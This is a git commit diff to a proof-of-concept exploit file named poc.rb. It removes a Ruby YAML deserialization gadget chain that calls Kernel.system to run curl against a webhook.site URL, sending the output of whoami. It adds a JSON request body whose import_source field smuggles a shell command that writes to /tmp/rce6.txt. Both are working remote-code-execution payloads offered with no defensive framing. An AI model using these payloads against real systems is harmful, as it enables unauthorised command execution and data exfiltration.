813d021315e2e0db1a860972f6ceee390a6a3e23
p0c0ng <117041809+p0c0ng@users.noreply.github.com>
2022-12-01 07:31:28 +0700

    Update poc.rb

--- poc.rb
+++ poc.rb
@@ -1,19 +1,8 @@
----
-- !ruby/object:Gem::Installer
-    i: x
-- !ruby/object:Gem::SpecFetcher
-    i: y
-- !ruby/object:Gem::Requirement
-  requirements:
-    !ruby/object:Gem::Package::TarReader
-    io: &1 !ruby/object:Net::BufferedIO
-      io: &1 !ruby/object:Gem::Package::TarReader::Entry
-         read: 0
-         header: "abc"
-      debug_output: &1 !ruby/object:Net::WriteAdapter
-         socket: &1 !ruby/object:Gem::RequestSet
-             sets: !ruby/object:Net::WriteAdapter
-                 socket: !ruby/module 'Kernel'
-                 method_id: :system
-             git_set: "/bin/bash -c 'curl https://webhook.site/84fcf1f2-2099-4dcb-bdee-4525d2325463/test.svg?cmd=`whoami`'"
-         method_id: :resolve
+{
+    "data": {
+        "project": {
+            "template_name": "rails",
+            "import_source": ";date|tee /tmp/rce6.txt;#",
+        }
+    }
+}
